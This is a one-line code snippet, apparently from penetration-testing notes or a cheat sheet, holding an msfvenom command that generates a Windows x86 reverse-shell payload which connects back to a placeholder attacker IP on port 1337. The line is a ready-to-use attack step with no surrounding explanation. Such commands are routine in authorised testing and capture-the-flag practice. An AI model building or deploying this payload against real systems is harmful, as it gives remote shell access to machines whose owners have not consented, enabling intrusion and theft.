```
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=<IP> LPORT=1337 -f <format>
```